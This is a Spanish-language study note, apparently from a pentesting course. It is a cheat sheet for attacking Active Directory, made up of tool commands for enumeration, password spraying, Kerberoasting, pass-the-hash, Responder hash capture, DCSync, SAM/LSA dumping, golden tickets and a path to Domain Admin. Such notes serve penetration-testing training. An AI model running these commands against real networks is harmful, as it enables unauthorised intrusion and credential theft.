

> [!info] Objetivo
> Guía concisa para atacar entornos Active Directory: enumeración, explotación y movimiento lateral.

---

## Fase 1: Reconocimiento

> [!tip] Descubrir el dominio

```bash
# DNS
nslookup <target>
nslookup -type=SRV _ldap._tcp.<domain>
nslookup -type=SRV _kerberos._tcp.<domain>

# Nmap
nmap -p 389,636,88,445,3268,3269 <target>
nmap -p 389,636,88,445 --script ldap*,smb* <target>
```

---

## Fase 2: Enumeración

> [!important] Mapear usuarios, grupos y servicios

### Sin credenciales (Fase 0 — BLOQUE 8)

```bash
# Null session / enumeración SMB sin credenciales
nxc smb <IP_DC> -u '' -p '' --shares
nxc smb <IP_DC> -u 'guest' -p '' --users

# RID Brute (cuando --users no devuelve nada)
nxc smb <IP_DC> -u '' -p '' --rid-brute
# Filtrar solo usuarios de la salida:
nxc smb <IP_DC> -u '' -p '' --rid-brute | grep "SidType User"

# Password spraying con la lista de usuarios obtenida
nxc smb <IP_DC> -u users.txt -p 'Password123' --no-brute force

# Kerbrute: validar existencia de usuarios sin bloquear cuentas
kerbrute userenum --dc <IP_DC> -d dominio.local users.txt
```

### LDAP

```bash
# Anonymous bind
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>"

# Con credenciales
ldapsearch -x -H ldap://<target> -D "user@<domain>" -w <pass> -b "DC=<domain>,DC=<tld>"

# Users
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName

# Groups
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=group)" cn

# Enumeración autenticada → HTML/JSON con usuarios (descripciones a veces
# contienen contraseñas filtradas por error humano), equipos y grupos
ldapdomaindump -u 'dominio.local\usuario' -p 'contrasena' <IP_DC>
```

### BloodHound

```bash
# Recopilar datos
bloodhound-python -u user -p pass -d <domain> -c All -ns <target>

# Sharphound
.\SharpHound.exe -c All -d <domain>

# neo4j
sudo neo4j console
```

### SMB

```bash
# Enumeración
enum4linux -a //<target>
crackmapexec smb <target> -u user -p pass --shares
smbclient -L //<target> -U user%pass

# Users
crackmapexec smb <target> -u user -p pass --users
```

### Kerberos

```bash
# Users
impacket-GetUserSPNs <domain>/user:pass -dc-ip <target> -request

# AS-REP
impacket-GetNPUsers <domain>/ -dc-ip <target> -usersfile users.txt -format hashcat -outputfile asrep.txt
```

---

## Fase 3: Explotación

> [!danger] Obtener acceso

### Pass-the-Hash

```bash
# SMB
crackmapexec smb <target> -u user -H <NTLM_HASH>

# PSExec
impacket-psexec -hashes :<NTLM_HASH> user@<target>

# WMIExec
impacket-wmiexec -hashes :<NTLM_HASH> user@<target>
```

### Kerberoasting

```bash
# Obtener tickets
impacket-GetUserSPNs <domain>/user:pass -request

# Crackear
hashcat -m 13100 tickets.txt rockyou.txt
john --format=krb5tgs tickets.txt
```

### AS-REP Roasting

```bash
# Obtener hashes
impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat

# Crackear
hashcat -m 18200 asrep.txt rockyou.txt
```

### Pass-the-Ticket

```bash
# Importar ticket
export KRB5CCNAME=/tmp/ticket.ccache

# Usar
impacket-psexec -k -no-pass user@<target>
```

### Unconstrained Delegation

```bash
# Buscar servidores
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Capturar tickets
Rubeus.exe monitor /interval:5 /nowrap
```

### Constrained Delegation

```bash
# Buscar
impacket-findDelegation <domain>/user:pass

# Explotar
impacket-getST -spn cifs/<target> -impersonate administrator <domain>/user:pass
```

### GPP Passwords en SYSVOL (BLOQUE 8)

Las Group Policy Preferences guardan contraseñas en el share SYSVOL, legibles con cualquier cuenta de dominio:

```bash
# Buscar Groups.xml en el share replication/SYSVOL
smbclient //<IP_DC>/SYSVOL -U usuario%pass
# Dentro: cd Policies, buscar rutas tipo
# Machine/Preferences/Groups/Groups.xml
get Groups.xml
# Descifrar el campo cpassword (la clave AES de Microsoft se filtró)
```

### Responder: captura de hashes NTLM (BLOQUE 8)

Cuando un cliente Windows busca un recurso que no existe (`\\SERVIDOR\recurso`) y pregunta por difusión, Responder contesta "soy yo" y captura el hash NTLMv2:

```bash
sudo responder -I eth0
# Log: /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt

# Crackear el hash capturado offline
hashcat -m 5600 hash_capturado.txt /usr/share/wordlists/rockyou.txt
```

---

## Fase 4: Movimiento Lateral

> [!tip] Expandir acceso

### Kerberos

```bash
# Golden Ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <domain> administrator

# Silver Ticket
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain <domain> -spn cifs/<target> user
```

### DCSync

```bash
# Extraer hashes del DC
impacket-secretsdump <domain>/user:pass@<target> -just-dc-ntlm

# Con Pass-the-Hash
impacket-secretsdump -hashes :<NTLM_HASH> <domain>/user@<target>
```

### ACL Abuse

```bash
# Buscar ACLs
bloodyAD -d <domain> -u user -p pass --host <target> get writable --otype user

# Modificar propiedades
bloodyAD -d <domain> -u user -p pass --host <target> set object target user msDS-AllowedToDelegateTo
```

### Movimiento con credenciales validadas (BLOQUE 8)

```bash
# ¿En qué máquinas el usuario es admin local?
# Los resultados marcados como (Pwn3d!) indican admin local en ese host
nxc smb 192.168.10.0/24 -u usuario -p 'contrasena'

# Volcar SAM/LSA en una máquina donde ya somos admin
nxc smb <IP> -u usuario -p 'contrasena' --sam
nxc smb <IP> -u usuario -p 'contrasena' --lsa

# Ejecutar comandos remotos con WMI/SMB
impacket-wmiexec dominio.local/usuario:contrasena@<IP>
```

---

## Fase 5: Dominio Completo

> [!warning] Conseguir Domain Admin

### Ruta Típica

```
1. User credenciales → Kerberoasting → Hash cracking
2. Service account → DCSync → KRBTGT hash
3. KRBTGT hash → Golden Ticket → Domain Admin
4. Domain Admin → DCSync → Todos los hashes
```

> [!important] CADENA COMPLETA (BLOQUE 5)
> ```
> Explotación inicial (servicio vulnerable) → Shell regular → Escalada local (SUID/Potato)
> → Credenciales filtradas → Movimiento lateral → Domain Admin
> ```
> En Windows: exploits locales → credenciales → movimientos laterales → persistencia → objetivo.
> En Linux: exploit → escalada (SUID/GTFOBins/cron) → root → flag.
> **Cada sistema tiene su propio camino** — no hay una técnica universal; la clave es entender el sistema y encontrar las debilidades específicas de su configuración.

### Herramientas

```bash
# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser
Get-DomainGroup
Get-DomainComputer

# ADRecon
.\ADRecon.ps1

# PingCastle
.\pingcastle.exe
```

---

## Referencia Rápida

| Objetivo | Herramienta |
|----------|-------------|
| Users | `ldapsearch`, `crackmapexec --users` |
| Groups | `ldapsearch`, `BloodHound` |
| Services | `nmap`, `BloodHound` |
| Hashes | `impacket-secretsdump`, `hashcat` |
| Tickets | `impacket-GetUserSPNs`, `Rubeus` |
| Delegation | `impacket-findDelegation`, `Rubeus` |
| ACLs | `bloodyAD`, `PowerView` |

---

#checklist
- [ ] Dominio identificado
- [ ] Usuarios enumerados (incluye RID brute y Kerbrute si `--users` falla)
- [ ] ldapdomaindump ejecutado (descripciones → contraseñas filtradas)
- [ ] GPP/cpassword en SYSVOL buscado
- [ ] Kerberoasting/AS-REP intentado
- [ ] Pass-the-Hash probado
- [ ] Delegation verificada
- [ ] Responder lanzado y hash NTLMv2 capturado/craqueado (modo 5600)
- [ ] Barrido nxc por `Pwn3d!` + volcado SAM/LSA
- [ ] Domain Admin obtenido









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../comandos/SMB_Impacket.md|SMB_Impacket]] — Linux, Linux, Windows
- [[../../apuntes evolve/BLOQUE 10.md|BLOQUE 10]] — Linux, Linux, Windows
- [[../comandos/Windows.md|Windows]] — Linux, Linux, Windows
- [[../comandos/Tmux.md|Tmux]] — Linux, Linux, Windows
- [[../../comandos/Windows.md|Windows]] — Linux, Linux, Windows

### 🌐 Cross-Dominio

- [[../../../redes/wpa2_wpa3.md|wpa2_wpa3]] — Redes: Criptografia, Linux, Redes
- [[../../../programacion/R/fundamentos_r.md|fundamentos_r]] — Programacion: Criptografia, Redes

> #crypto #linux #linux_ciber #redes #tmux #windows_ciber
